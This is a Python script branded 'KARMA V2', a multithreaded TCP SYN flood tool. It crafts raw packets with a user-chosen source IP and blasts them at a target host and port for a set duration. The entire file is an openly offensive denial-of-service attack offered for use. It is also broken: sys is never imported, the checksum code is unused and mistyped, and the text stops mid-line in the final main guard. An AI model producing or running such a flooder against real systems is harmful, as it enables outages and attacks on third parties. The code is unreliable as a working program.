import socket

import threading

import random

import time

from struct import pack

MAX_PACKET_SIZE = 4096

PHI = 0x9e3779b9

Q = [0] * 4096

c = 362436

floodport = 0

limiter = 0

pps = 0

sleeptime = 100

start_time = 0

duration = 0

def init_rand(x):

    global Q

    Q[0] = int(x)

    Q[1] = int(x + PHI)

    Q[2] = int(x + PHI + PHI)

    for i in range(3, 4096):

        Q[i] = Q[i - 3] ^ Q[i - 2] ^ int(PHI) ^ i

def rand_cmwc():

    global c

    global Q

    t = 0

    a = 18782

    i = 4095

    x = 0

    r = 0xfffffffe

    i = (i + 1) & 4095

    t = a * Q[i] + c

    c = (t >> 32)

    x = t + c

    if x < c:

        x += 1

        c += 1

    Q[i] = r - x

    return Q[i]

def csum(buf):

    count = len(buf)

    sum = 0

    index = 0

    while count > 1:

        sum += buf[index] << 8 | buf[index + 1]

        count -= 2

        index += 2

    if count > 0:

        sum += buf[index] << 8

    while sum >> 16:

        sum = (sum & 0xFFFF) + (sum >> 16)

    return ~sum & 0xFFFF

def tcpcsum(iph, tcph):

    pseudohead = pack('!LBBH', iph['saddr'], iph['daddr'], 0, iph['proto'], len(tcph))

    pseudopacket = pseudohead + tcph

    return csum(pseudopacket)

def setup_ip_header(source_ip, dest_ip):

    iph = {}

    iph['ihl'] = 5

    iph['version'] = 4

    iph['tos'] = 0

    iph['tot_len'] = 20 + 20

    iph['id'] = 54321

    iph['frag_off'] = 0

    iph['ttl'] = 255

    iph['protocol'] = socket.IPPROTO_TCP

    iph['check'] = 0

    iph['saddr'] = socket.inet_aton(source_ip)

    iph['daddr'] = socket.inet_aton(dest_ip)

    return iph

def setup_tcp_header():

    tcph = {}

    tcph['source'] = random.randint(1024, 65535)

    tcph['seq'] = random.randint(1, 4294967295)

    tcph['ack_seq'] = 0

    tcph['doff'] = 5

    tcph['syn'] = 1

    tcph['window'] = socket.htons(65535)

    tcph['check'] = 0

    tcph['urg_ptr'] = 0

    return tcph

def flood(source_ip, host, duration):

    global floodport

    global limiter

    global pps

    global sleeptime

    global start_time

    threading.Thread(target=update_console, args=(duration,)).start()

    port = floodport

    iph = setup_ip_header(source_ip, host)

    tcph = setup_tcp_header()

    if port == 0:

        tcph['dest'] = random.randint(1024, 65535)

    else:

        tcph['dest'] = port

    tcph['seq'] = random.randint(1, 4294967295)

    synpacket = pack('!BBHHHBBH4s4s', iph['version'] << 4 | iph['ihl'], iph['tos'], iph['tot_len'], iph['id'], iph['frag_off'], iph['ttl'], iph['protocol'], iph['check'], iph['saddr'], iph['daddr']) + pack('!HHLLBBHHH', tcph['source'], tcph['dest'], tcph['seq'], tcph['ack_seq'], tcph['doff'] << 4 | 0, tcph['syn'], tcph['window'], tcph['check'], tcph['urg_ptr'])

    while duration >= time.time() - start_time:

        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)

        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

        s.sendto(synpacket, (host, 0))

        pps += 1

        if pps >= limiter:

            pps = 0

            time.sleep(sleeptime / 1000)

def update_console(duration):

    global start_time

    while duration >= time.time() - start_time:

        print(' Duration: %s' % (time.time() - start_time))

        time.sleep(1)

def main():

    global floodport

    global limiter

    global pps

    global sleeptime

    global start_time

    global duration

    print('___[KARMA]___')

    print('|   |    |   |')

    print('|   |    |   |')

    print('|   |    |   |')

    print('    KARMA V2')

    source_ip = input('Enter Source IP: ')

    host = input('Enter Target Host IP: ')

    port = input('Enter Target Port (0 for random): ')

    thread_count = input('Enter Number of Threads: ')

    duration = input('Enter Duration (seconds): ')

    sleeptime = input('Enter Sleeptime (milliseconds): ')

    limiter = input('Enter Limiter: ')

    try:

        floodport = int(port)

        limiter = int(limiter)

        duration = int(duration)

        thread_count = int(thread_count)

        sleeptime = int(sleeptime)

    except ValueError:

        sys.exit('Invalid Input')

    print('\n[+] Starting Attack...')

    start_time = time.time()

    init_rand(time.time())

    for _ in range(thread_count):

        threading.Thread(target=flood, args=(source_ip, host, duration)).start()

if __name__ == '__

